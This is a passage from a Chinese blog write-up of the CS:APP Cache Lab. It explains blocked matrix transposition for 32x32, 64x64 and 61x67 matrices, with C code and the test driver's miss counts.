class="number">4</span>] = a4, B[i + <span class="number">1</span>][j + <span class="number">5</span>] = a5, B[i + <span class="number">1</span>][j + <span class="number">6</span>] = a6, B[i + <span class="number">1</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            a0 = A[i + <span class="number">2</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">2</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">2</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">2</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">2</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">2</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">2</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">2</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">2</span>][j + <span class="number">0</span>] = B[i + <span class="number">0</span>][j + <span class="number">2</span>], B[i + <span class="number">0</span>][j + <span class="number">2</span>] = a0;</span><br><span class="line">            B[i + <span class="number">2</span>][j + <span class="number">1</span>] = B[i + <span class="number">1</span>][j + <span class="number">2</span>], B[i + <span class="number">1</span>][j + <span class="number">2</span>] = a1;</span><br><span class="line">            B[i + <span class="number">2</span>][j + <span class="number">2</span>] = a2, B[i + <span class="number">2</span>][j + <span class="number">3</span>] = a3;</span><br><span class="line">            B[i + <span class="number">2</span>][j + <span class="number">4</span>] = a4, B[i + <span class="number">2</span>][j + <span class="number">5</span>] = a5, B[i + <span class="number">2</span>][j + <span class="number">6</span>] = a6, B[i + <span class="number">2</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            a0 = A[i + <span class="number">3</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">3</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">3</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">3</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">3</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">3</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">3</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">3</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">3</span>][j + <span class="number">0</span>] = B[i + <span class="number">0</span>][j + <span class="number">3</span>], B[i + <span class="number">0</span>][j + <span class="number">3</span>] = a0;</span><br><span class="line">            B[i + <span class="number">3</span>][j + <span class="number">1</span>] = B[i + <span class="number">1</span>][j + <span class="number">3</span>], B[i + <span class="number">1</span>][j + <span class="number">3</span>] = a1;</span><br><span class="line">            B[i + <span class="number">3</span>][j + <span class="number">2</span>] = B[i + <span class="number">2</span>][j + <span class="number">3</span>], B[i + <span class="number">2</span>][j + <span class="number">3</span>] = a2;</span><br><span class="line">            B[i + <span class="number">3</span>][j + <span class="number">3</span>] = a3;</span><br><span class="line">            B[i + <span class="number">3</span>][j + <span class="number">4</span>] = a4, B[i + <span class="number">3</span>][j + <span class="number">5</span>] = a5, B[i + <span class="number">3</span>][j + <span class="number">6</span>] = a6, B[i + <span class="number">3</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            a0 = A[i + <span class="number">4</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">4</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">4</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">4</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">4</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">4</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">4</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">4</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">4</span>][j + <span class="number">0</span>] = B[i + <span class="number">0</span>][j + <span class="number">4</span>], B[i + <span class="number">0</span>][j + <span class="number">4</span>] = a0;</span><br><span class="line">            B[i + <span class="number">4</span>][j + <span class="number">1</span>] = B[i + <span class="number">1</span>][j + <span class="number">4</span>], B[i + <span class="number">1</span>][j + <span class="number">4</span>] = a1;</span><br><span class="line">            B[i + <span class="number">4</span>][j + <span class="number">2</span>] = B[i + <span class="number">2</span>][j + <span class="number">4</span>], B[i + <span class="number">2</span>][j + <span class="number">4</span>] = a2;</span><br><span class="line">            B[i + <span class="number">4</span>][j + <span class="number">3</span>] = B[i + <span class="number">3</span>][j + <span class="number">4</span>], B[i + <span class="number">3</span>][j + <span class="number">4</span>] = a3;</span><br><span class="line">            B[i + <span class="number">4</span>][j + <span class="number">4</span>] = a4, B[i + <span class="number">4</span>][j + <span class="number">5</span>] = a5, B[i + <span class="number">4</span>][j + <span class="number">6</span>] = a6, B[i + <span class="number">4</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            a0 = A[i + <span class="number">5</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">5</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">5</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">5</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">5</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">5</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">5</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">5</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">5</span>][j + <span class="number">0</span>] = B[i + <span class="number">0</span>][j + <span class="number">5</span>], B[i + <span class="number">0</span>][j + <span class="number">5</span>] = a0;</span><br><span class="line">            B[i + <span class="number">5</span>][j + <span class="number">1</span>] = B[i + <span class="number">1</span>][j + <span class="number">5</span>], B[i + <span class="number">1</span>][j + <span class="number">5</span>] = a1;</span><br><span class="line">            B[i + <span class="number">5</span>][j + <span class="number">2</span>] = B[i + <span class="number">2</span>][j + <span class="number">5</span>], B[i + <span class="number">2</span>][j + <span class="number">5</span>] = a2;</span><br><span class="line">            B[i + <span class="number">5</span>][j + <span class="number">3</span>] = B[i + <span class="number">3</span>][j + <span class="number">5</span>], B[i + <span class="number">3</span>][j + <span class="number">5</span>] = a3;</span><br><span class="line">            B[i + <span class="number">5</span>][j + <span class="number">4</span>] = B[i + <span class="number">4</span>][j + <span class="number">5</span>], B[i + <span class="number">4</span>][j + <span class="number">5</span>] = a4;</span><br><span class="line">            B[i + <span class="number">5</span>][j + <span class="number">5</span>] = a5, B[i + <span class="number">5</span>][j + <span class="number">6</span>] = a6, B[i + <span class="number">5</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            a0 = A[i + <span class="number">6</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">6</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">6</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">6</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">6</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">6</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">6</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">6</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">6</span>][j + <span class="number">0</span>] = B[i + <span class="number">0</span>][j + <span class="number">6</span>], B[i + <span class="number">0</span>][j + <span class="number">6</span>] = a0;</span><br><span class="line">            B[i + <span class="number">6</span>][j + <span class="number">1</span>] = B[i + <span class="number">1</span>][j + <span class="number">6</span>], B[i + <span class="number">1</span>][j + <span class="number">6</span>] = a1;</span><br><span class="line">            B[i + <span class="number">6</span>][j + <span class="number">2</span>] = B[i + <span class="number">2</span>][j + <span class="number">6</span>], B[i + <span class="number">2</span>][j + <span class="number">6</span>] = a2;</span><br><span class="line">            B[i + <span class="number">6</span>][j + <span class="number">3</span>] = B[i + <span class="number">3</span>][j + <span class="number">6</span>], B[i + <span class="number">3</span>][j + <span class="number">6</span>] = a3;</span><br><span class="line">            B[i + <span class="number">6</span>][j + <span class="number">4</span>] = B[i + <span class="number">4</span>][j + <span class="number">6</span>], B[i + <span class="number">4</span>][j + <span class="number">6</span>] = a4;</span><br><span class="line">            B[i + <span class="number">6</span>][j + <span class="number">5</span>] = B[i + <span class="number">5</span>][j + <span class="number">6</span>], B[i + <span class="number">5</span>][j + <span class="number">6</span>] = a5;</span><br><span class="line">            B[i + <span class="number">6</span>][j + <span class="number">6</span>] = a6, B[i + <span class="number">6</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            a0 = A[i + <span class="number">7</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">7</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">7</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">7</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">7</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">7</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">7</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">7</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">0</span>] = B[i + <span class="number">0</span>][j + <span class="number">7</span>], B[i + <span class="number">0</span>][j + <span class="number">7</span>] = a0;</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">1</span>] = B[i + <span class="number">1</span>][j + <span class="number">7</span>], B[i + <span class="number">1</span>][j + <span class="number">7</span>] = a1;</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">2</span>] = B[i + <span class="number">2</span>][j + <span class="number">7</span>], B[i + <span class="number">2</span>][j + <span class="number">7</span>] = a2;</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">3</span>] = B[i + <span class="number">3</span>][j + <span class="number">7</span>], B[i + <span class="number">3</span>][j + <span class="number">7</span>] = a3;</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">4</span>] = B[i + <span class="number">4</span>][j + <span class="number">7</span>], B[i + <span class="number">4</span>][j + <span class="number">7</span>] = a4;</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">5</span>] = B[i + <span class="number">5</span>][j + <span class="number">7</span>], B[i + <span class="number">5</span>][j + <span class="number">7</span>] = a5;</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">6</span>] = B[i + <span class="number">6</span>][j + <span class="number">7</span>], B[i + <span class="number">6</span>][j + <span class="number">7</span>] = a6;</span><br><span class="line">            B[i + <span class="number">7</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 对角线不在块中，这部分和前面trans0()函数中的一样</span></span><br><span class="line">            <span class="keyword">for</span> (ii = i; ii &lt; i + <span class="number">8</span>; ii++) &#123;</span><br><span class="line">                a0 = A[ii][j + <span class="number">0</span>];</span><br><span class="line">                a1 = A[ii][j + <span class="number">1</span>];</span><br><span class="line">                a2 = A[ii][j + <span class="number">2</span>];</span><br><span class="line">                a3 = A[ii][j + <span class="number">3</span>];</span><br><span class="line">                a4 = A[ii][j + <span class="number">4</span>];</span><br><span class="line">                a5 = A[ii][j + <span class="number">5</span>];</span><br><span class="line">                a6 = A[ii][j + <span class="number">6</span>];</span><br><span class="line">                a7 = A[ii][j + <span class="number">7</span>];</span><br><span class="line">                B[j + <span class="number">0</span>][ii] = a0;</span><br><span class="line">                B[j + <span class="number">1</span>][ii] = a1;</span><br><span class="line">                B[j + <span class="number">2</span>][ii] = a2;</span><br><span class="line">                B[j + <span class="number">3</span>][ii] = a3;</span><br><span class="line">                B[j + <span class="number">4</span>][ii] = a4;</span><br><span class="line">                B[j + <span class="number">5</span>][ii] = a5;</span><br><span class="line">                B[j + <span class="number">6</span>][ii] = a6;</span><br><span class="line">                B[j + <span class="number">7</span>][ii] = a7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码看起来有点吓人，因为我不喜欢用别人有水印的图，自己又懒得作图，靠打字有点难说，推荐不理解的同学拿上纸和笔跟着推导一下。不需要完全推到到最后，写个两三行应该就能领会其意。实在不明白请参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/xbb224007/article/details/81103995">参考1</a>。</p>
<p>测试一下缺失数是否达到最低的<code>256</code>次</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function <span class="number">0</span> (<span class="number">3</span> total)</span><br><span class="line">Step <span class="number">1</span>: Validating <span class="keyword">and</span> generating memory traces</span><br><span class="line">Step <span class="number">2</span>: Evaluating performance (s=<span class="number">5</span>, E=<span class="number">1</span>, b=<span class="number">5</span>)</span><br><span class="line">func <span class="number">0</span> (Transpose submission): hits:<span class="number">2018</span>, misses:<span class="number">259</span>, evictions:<span class="number">227</span></span><br></pre></td></tr></table></figure>

<p>实际缺失<code>259</code>次，比理论预期多了三次。根据参考1，这是由于系统的额外三次开销，并非程序问题，即我们的思路于代码是对的，只需缺失<code>256</code>次即可完成矩阵转置</p>
<h3 id="64-x-64"><a href="#64-x-64" class="headerlink" title="64 x 64"></a>64 x 64</h3><p>当矩阵规模来到<code>64 x 64</code>后，若继续将其划分为若干<code>8 x 8</code>有些不太合适。若<code>B[0][0]</code>加载于<code>set 0</code>中，则<code>B[1][0]</code>加载于<code>set 8</code>中，</p>
<p><code>B[2][0]</code>加载于<code>set 16</code>中，<code>B[3][0]</code>加载于<code>set 24</code>中，缓存中最多只能同时放下B数组连续的4列，于是考虑将整个矩阵全划分为<code>4 x 4</code>大小的分块，得函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> trans_desc1[] = <span class="string">&quot;4 x 4&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans1</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j, ii, a0, a1, a2, a3;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">4</span>) &#123;</span><br><span class="line">			<span class="keyword">for</span> (ii = i; ii &lt; i + <span class="number">4</span>; ii++) &#123;</span><br><span class="line">				a0 = A[ii][j + <span class="number">0</span>];</span><br><span class="line">				a1 = A[ii][j + <span class="number">1</span>];</span><br><span class="line">				a2 = A[ii][j + <span class="number">2</span>];</span><br><span class="line">				a3 = A[ii][j + <span class="number">3</span>];</span><br><span class="line">				B[j + <span class="number">0</span>][ii] = a0;</span><br><span class="line">				B[j + <span class="number">1</span>][ii] = a1;</span><br><span class="line">				B[j + <span class="number">2</span>][ii] = a2;</span><br><span class="line">				B[j + <span class="number">3</span>][ii] = a3;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果为</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function <span class="number">0</span> (<span class="number">1</span> total)</span><br><span class="line">Step <span class="number">1</span>: Validating <span class="keyword">and</span> generating memory traces</span><br><span class="line">Step <span class="number">2</span>: Evaluating performance (s=<span class="number">5</span>, E=<span class="number">1</span>, b=<span class="number">5</span>)</span><br><span class="line">func <span class="number">0</span> (<span class="number">4</span> x <span class="number">4</span>): hits:<span class="number">6498</span>, misses:<span class="number">1699</span>, evictions:<span class="number">1667</span></span><br></pre></td></tr></table></figure>

<p>1699次缺失，不太理想。按这种分块，当访问如<code>A[0][0]</code>元素时，将<code>A[0][0]</code>至<code>A[0][７]</code>八个元素都加载入缓存中，而我们只使用了<code>A[0][0]</code>到<code>A[0][３]</code>四个元素，后四个元素被遗弃，后续需要使用这些元素时又得将这八个元素再次加载入内存，由此造成了不必要的缺失。同之前的思路，既然一次加载八个元素入缓存，后四个暂时用不上，考虑将其存储于某处，条件满足时再将其从暂存处取出使用，而不必再次将这些元素加载到缓存中，从而减少缺失次数。具体地，我们仍将<code>64 x 64</code>分为16个<code>8 x 8</code>大小的块，再将每个<code>8 x 8</code>的块分为4个<code>4 x 4</code>的块，分别取左上、右上、左下、右下四小块为一号块、二号块、三号块与四号块，如下图</p>
<img src="/2021/04/05/CSAPP-Labs/cachelab_1.jpg" class>

<p>我们先取A数组前四行，转置后应放在B数组的一号块与三号块处，但鉴于两块互相覆盖，暂时将三号块的内容存于二号块中，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ii = i; ii &lt; i + <span class="number">4</span>; ii++) &#123;</span><br><span class="line">    a0 = A[ii][j + <span class="number">0</span>], a1 = A[ii][j + <span class="number">1</span>], a2 = A[ii][j + <span class="number">2</span>], a3 = A[ii][j + <span class="number">3</span>];</span><br><span class="line">    a4 = A[ii][j + <span class="number">4</span>], a5 = A[ii][j + <span class="number">5</span>], a6 = A[ii][j + <span class="number">6</span>], a7 = A[ii][j + <span class="number">7</span>];</span><br><span class="line">    B[j + <span class="number">0</span>][ii + <span class="number">0</span>] = a0, B[j + <span class="number">1</span>][ii + <span class="number">0</span>] = a1, B[j + <span class="number">2</span>][ii + <span class="number">0</span>] = a2, B[j + <span class="number">3</span>][ii + <span class="number">0</span>] = a3;</span><br><span class="line">    B[j + <span class="number">0</span>][ii + <span class="number">4</span>] = a4, B[j + <span class="number">1</span>][ii + <span class="number">4</span>] = a5, B[j + <span class="number">2</span>][ii + <span class="number">4</span>] = a6, B[j + <span class="number">3</span>][ii + <span class="number">4</span>] = a7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，我们竖着放。举例：<code>A[4][0], A[5][0], A[6][0], A[7][0]</code>转置后应放置于<code>B[0][4], B[0][5], B[0][6], B[0][7]</code>中，按此方法将A数组第三块中的16个元素一列一列的放于对应的B数组第二块中。但原本B数组第二块中暂存着属于B数组第三块中的内容，因此顺序应是先将A数组对应列元素取出暂存，将B数组对应行元素也取出暂存，然后将A数组暂存值放入B数组第二块对应位置，将B数组取出暂存的值放入B数组第三块正确位置，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (jj = j; jj &lt; j + <span class="number">4</span>; jj++) &#123;</span><br><span class="line">    <span class="comment">/* 暂存A数组元素 */</span></span><br><span class="line">    a0 = A[i + <span class="number">4</span>][jj], a1 = A[i + <span class="number">5</span>][jj], a2 = A[i + <span class="number">6</span>][jj], a3 = A[i + <span class="number">7</span>][jj];</span><br><span class="line">    <span class="comment">/* 暂存B数组第二块原本暂存的元素 */</span></span><br><span class="line">    a4 = B[jj][i + <span class="number">4</span>], a5 = B[jj][i + <span class="number">5</span>], a6 = B[jj][i + <span class="number">6</span>], a7 = B[jj][i + <span class="number">7</span>];</span><br><span class="line">    <span class="comment">/* A数组第三块元素放入B数组第二块中 */</span></span><br><span class="line">    B[jj][i + <span class="number">4</span>] = a0, B[jj][i + <span class="number">5</span>] = a1, B[jj][i + <span class="number">6</span>] = a2, B[jj][i + <span class="number">7</span>] = a3;</span><br><span class="line">    <span class="comment">/* 原本应该放于B数组第三块的元素 */</span></span><br><span class="line">    B[jj + <span class="number">4</span>][i + <span class="number">0</span>] = a4, B[jj + <span class="number">4</span>][i + <span class="number">1</span>] = a5, B[jj + <span class="number">4</span>][i + <span class="number">2</span>] = a6, B[jj + <span class="number">4</span>][i + <span class="number">3</span>] = a7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，A、B数组均只剩下第四块待完成，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ii = i + <span class="number">4</span>; ii &lt; i + <span class="number">8</span>; ii++) &#123;</span><br><span class="line">    a0 = A[ii][j + <span class="number">4</span>], a1 = A[ii][j + <span class="number">5</span>], a2 = A[ii][j + <span class="number">6</span>], a3 = A[ii][j + <span class="number">7</span>];</span><br><span class="line">    B[j + <span class="number">4</span>][ii] = a0, B[j + <span class="number">5</span>][ii] = a1, B[j + <span class="number">6</span>][ii] = a2, B[j + <span class="number">7</span>][ii] = a3;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>完整代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (M == <span class="number">64</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (ii = i; ii &lt; i + <span class="number">4</span>; ii++) &#123;</span><br><span class="line">                a0 = A[ii][j + <span class="number">0</span>], a1 = A[ii][j + <span class="number">1</span>], a2 = A[ii][j + <span class="number">2</span>], a3 = A[ii][j + <span class="number">3</span>];</span><br><span class="line">                a4 = A[ii][j + <span class="number">4</span>], a5 = A[ii][j + <span class="number">5</span>], a6 = A[ii][j + <span class="number">6</span>], a7 = A[ii][j + <span class="number">7</span>];</span><br><span class="line">                B[j + <span class="number">0</span>][ii + <span class="number">0</span>] = a0, B[j + <span class="number">1</span>][ii + <span class="number">0</span>] = a1, B[j + <span class="number">2</span>][ii + <span class="number">0</span>] = a2, B[j + <span class="number">3</span>][ii + <span class="number">0</span>] = a3;</span><br><span class="line">                B[j + <span class="number">0</span>][ii + <span class="number">4</span>] = a4, B[j + <span class="number">1</span>][ii + <span class="number">4</span>] = a5, B[j + <span class="number">2</span>][ii + <span class="number">4</span>] = a6, B[j + <span class="number">3</span>][ii + <span class="number">4</span>] = a7;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (jj = j; jj &lt; j + <span class="number">4</span>; jj++) &#123;</span><br><span class="line">                a0 = A[i + <span class="number">4</span>][jj], a1 = A[i + <span class="number">5</span>][jj], a2 = A[i + <span class="number">6</span>][jj], a3 = A[i + <span class="number">7</span>][jj];</span><br><span class="line">                a4 = B[jj][i + <span class="number">4</span>], a5 = B[jj][i + <span class="number">5</span>], a6 = B[jj][i + <span class="number">6</span>], a7 = B[jj][i + <span class="number">7</span>];</span><br><span class="line">                B[jj][i + <span class="number">4</span>] = a0, B[jj][i + <span class="number">5</span>] = a1, B[jj][i + <span class="number">6</span>] = a2, B[jj][i + <span class="number">7</span>] = a3;</span><br><span class="line">                B[jj + <span class="number">4</span>][i + <span class="number">0</span>] = a4, B[jj + <span class="number">4</span>][i + <span class="number">1</span>] = a5, B[jj + <span class="number">4</span>][i + <span class="number">2</span>] = a6, B[jj + <span class="number">4</span>][i + <span class="number">3</span>] = a7;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (ii = i + <span class="number">4</span>; ii &lt; i + <span class="number">8</span>; ii++) &#123;</span><br><span class="line">                a0 = A[ii][j + <span class="number">4</span>], a1 = A[ii][j + <span class="number">5</span>], a2 = A[ii][j + <span class="number">6</span>], a3 = A[ii][j + <span class="number">7</span>];</span><br><span class="line">                B[j + <span class="number">4</span>][ii] = a0, B[j + <span class="number">5</span>][ii] = a1, B[j + <span class="number">6</span>][ii] = a2, B[j + <span class="number">7</span>][ii] = a3;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function <span class="number">0</span> (<span class="number">1</span> total)</span><br><span class="line">Step <span class="number">1</span>: Validating <span class="keyword">and</span> generating memory traces</span><br><span class="line">Step <span class="number">2</span>: Evaluating performance (s=<span class="number">5</span>, E=<span class="number">1</span>, b=<span class="number">5</span>)</span><br><span class="line">func <span class="number">0</span> (Transpose submission): hits:<span class="number">9066</span>, misses:<span class="number">1179</span>, evictions:<span class="number">1147</span></span><br></pre></td></tr></table></figure>

<p>已达到满分要求</p>
<p>这里说明下为啥按上面方案这么做，其实我也是参考了别人的思路。我自己做想到了在转置第一块时将原本属于B数组第三块的内容暂存于B数组第二块，也就是上述的第一步，以此避免一些不必要的缺失。但后续我当时考虑的是B数组接下来的四行也这么做，这样的话B数组第一块和第四块的元素都是正确的，第二块和第三块的元素刚好反了，那么就再交换一轮就好。但是若是按我的思路，交换第二块和第三块将会比上面这种方法多很多缺失，别人这个确实比我的更加精妙</p>
<h3 id="61-x-67"><a href="#61-x-67" class="headerlink" title="61 x 67"></a>61 x 67</h3><p>这个“不规则的”初看很难，实际上算是最简单的，直接分块即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i += <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (jj = j; jj &lt; j + <span class="number">16</span> &amp;&amp; jj &lt; N; jj++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (ii = i; ii &lt; i + <span class="number">16</span> &amp;&amp; i &lt; M; ii++) &#123;</span><br><span class="line">                B[ii][jj] = A[jj][ii];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，同等大小分块，采取B数组逐行扫描比采取A数组逐行扫描缺失数更低，测试结果</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function <span class="number">0</span> (<span class="number">1</span> total)</span><br><span class="line">Step <span class="number">1</span>: Validating <span class="keyword">and</span> generating memory traces</span><br><span class="line">Step <span class="number">2</span>: Evaluating performance (s=<span class="number">5</span>, E=<span class="number">1</span>, b=<span class="number">5</span>)</span><br><span class="line">func <span class="number">0</span> (Transpose submission): hits:<span class="number">6673</span>, misses:<span class="number">1908</span>, evictions:<span class="number">1876</span></span><br></pre></td></tr></table></figure>

<p>你问我为什么知道分<code>16 x16</code>大小？把所有可能都试一下就知道了，我测试了<code>4 x 4</code>大小到<code>20 x 20</code>大小的分块可能，我的机器上测出来是<code>16 x 16</code>分块的缺失数目最小，但看别人测出来是<code>17 x 17</code>最小，没深入钻这个，不想管了</p>
<h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fez</span>@papyruszzz:~/Desktop/CacheLab$ ./driver.py </span><br><span class="line"><span class="attribute">Part</span> A: Testing cache simulator</span><br><span class="line"><span class="attribute">Running</span> ./test-csim</span><br><span class="line">                        <span class="attribute">Your</span> simulator     Reference simulator</span><br><span class="line"><span 